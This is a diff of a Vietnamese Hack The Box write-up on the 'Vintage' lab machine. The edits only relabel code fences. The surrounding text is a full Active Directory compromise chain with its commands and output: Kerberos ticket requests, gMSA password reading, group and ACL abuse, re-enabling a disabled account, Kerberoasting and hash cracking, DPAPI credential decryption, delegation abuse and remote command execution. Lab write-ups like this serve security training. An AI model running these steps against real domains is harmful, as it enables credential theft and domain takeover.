@@ -80,7 +80,7 @@ Host script results:
 
 Nmap cho thấy một DC điển hình. Điểm đáng chú ý là khi thử bind LDAP bằng creds ban đầu:
 
-```
+```bash
   nxc ldap DC01 -u p.rosa -p Rosaisbest123 -M whoami 
 LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
 LDAP        10.129.231.205  389    DC01             [-] vintage.htb\p.rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
@@ -88,7 +88,7 @@ LDAP        10.129.231.205  389    DC01             [-] vintage.htb\p.rosa:Rosai
 
 `STATUS_NOT_SUPPORTED` ở đây không phải sai mật khẩu mà là NTLM đã bị tắt trên domain (để ý `NTLM:False` trong output). Từ đây mọi thao tác đều phải đi qua Kerberos: Lấy TGT rồi dùng ccache.
 
-```
+```bash
   getTGT.py vintage.htb/p.rosa:Rosaisbest123
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -110,7 +110,7 @@ WHOAMI      DC01            389    DC01             User SID: S-1-5-21-402433782
 
 Liệt kê tài khoản máy, có ba máy: `DC01$`, `gMSA01$`, `FS01$`. 
 
-```
+```bash
   nxc ldap DC01 -k --use-kcache --computers
 LDAP        DC01            389    DC01             [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
 LDAP        DC01            389    DC01             [+] VINTAGE.HTB\p.rosa from ccache 
@@ -125,7 +125,7 @@ LDAP        DC01            389    DC01             FS01$
 Nhiều khả năng FS01$ là tài khoản pre2k nên mình thử dùng module pre2k của NetExec, không hiểu sao nó không hốt được `FS01$` nhưng thử tay thì lại được.
 
 
-```
+```bash
   nxc ldap DC01 -k --use-kcache -M pre2k
 LDAP        DC01            389    DC01             [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
 LDAP        DC01            389    DC01             [+] VINTAGE.HTB\p.rosa from ccache
@@ -141,7 +141,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 `FS01$` nằm trong `Domain Computers` và `gMSA01$` cho phép `Domain Computers` đọc mật khẩu của nó (`PrincipalsAllowedToReadPassword: Domain Computers`).
 
-```
+```bash
   export KRB5CCNAME=fs01\$.ccache 
   nxc ldap DC01 -k --use-kcache --gmsa
 LDAP        DC01            389    DC01             [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
@@ -163,7 +163,7 @@ Trong 3 tài khoản dịch vụ thì `svc_sql` gắn với SQL thường là co
 
 Thử thêm mình vào `SERVICEMANAGERS` và thành công.
 
-```
+```bash
   getTGT.py 'vintage.htb/gmsa01$:fs01' -hashes :f44e1eceaa7a24c32e8a54d62d032f96
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -174,7 +174,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ```
 Thêm genericAll lên `svc_sql`:
 
-```
+```bash
   getTGT.py 'vintage.htb/gmsa01$:fs01' -hashes :f44e1eceaa7a24c32e8a54d62d032f96
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -191,7 +191,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Xin TGT cho `svc_sql` thì gặp `KDC_ERR_CLIENT_REVOKED`:
 
 
-```
+```bash
   getTGT.py vintage.htb/svc_sql:Password123
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -200,14 +200,14 @@ Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revo
 
 Nghĩa là tài khoản đang bị vô hiệu hóa (cờ UAC của nó có tên `ACCOUNTDISABLE`). Vì đang có genericAll nên ta gỡ nó luôn:
 
-```
+```bash
   bloodyad -k -d vintage.htb -H DC01.vintage.htb remove uac svc_sql -f ACCOUNTDISABLE
 [+] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
 ```
 
 `svc_sql` chưa có SPN nên không Kerberoast trực tiếp được. Ta tự gắn SPN rồi roast:
 
-```
+```bash
   bloodyad -k -d vintage.htb -H DC01.vintage.htb set object svc_sql servicePrincipalName -v mssqlsvc/DC01
 [+] svc_sql's servicePrincipalName has been updated
   nxc ldap DC01 -k --use-kcache --kerberoasting kerberoast.txt
@@ -221,7 +221,7 @@ LDAP        DC01            389    DC01             $krb5tgs$23$*svc_sql$VINTAGE
 
 Lưu vào file và crack bằng Hashcat với `rockyou.txt` ra được mật khẩu: `Zer0the0ne`
 
-```
+```bash
   nano hash
   hashcat hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -a 0
 <SNIP>
@@ -234,7 +234,7 @@ $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$8af357388bdad83b8b5e67373a
 `Zer0the0ne` được dùng lại cho `c.neri` (Domain chỉ có vài user nên mình rải kèm xin vé luôn):
 
 
-```
+```bash
   getTGT.py vintage.htb/c.neri:Zer0the0ne
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -246,7 +246,7 @@ Cậu này trong BloodHound cho thấy thuộc nhóm `REMOTE MANAGEMENT USERS` n
 ![](/assets/img/htb-vintage/bloodhound-2.png)
 
 
-```
+```bash
   export KRB5CCNAME=c.neri.ccache
   sudo nano /etc/krb5.conf 
 [sudo] password for aeverie: 
@@ -363,7 +363,7 @@ curl.exe :   % Total    % Received % Xferd  Average Speed   Time    Time     Tim
 
 Giải mã masterkey:
 
-```
+```bash
   dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -384,7 +384,7 @@ Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e6
 Giải mã creds, nhặt được tài khoản `c.neri_adm`
 
 
-```
+```bash
   dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -414,7 +414,7 @@ Khác với constrained delegation cổ điển (cấu hình nằm trên tài kh
 
 Thêm `FS01$` vào nhóm:
 
-```fish
+```bash
   getTGT.py vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -427,7 +427,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Xin lại vé và thực hiện s4u:
 
 
-```
+```bash
   getTGT.py 'vintage.htb/fs01$:fs01'
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -444,7 +444,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Đọc `root.txt`:
 
-```
+```bash
   export KRB5CCNAME=l.bianchi_adm@cifs_DC01.vintage.htb@VINTAGE.HTB.ccache 
   nxc smb DC01.vintage.htb -k --use-kcache -x "type C:\Users\Administrator\Desktop\root.txt"
 SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
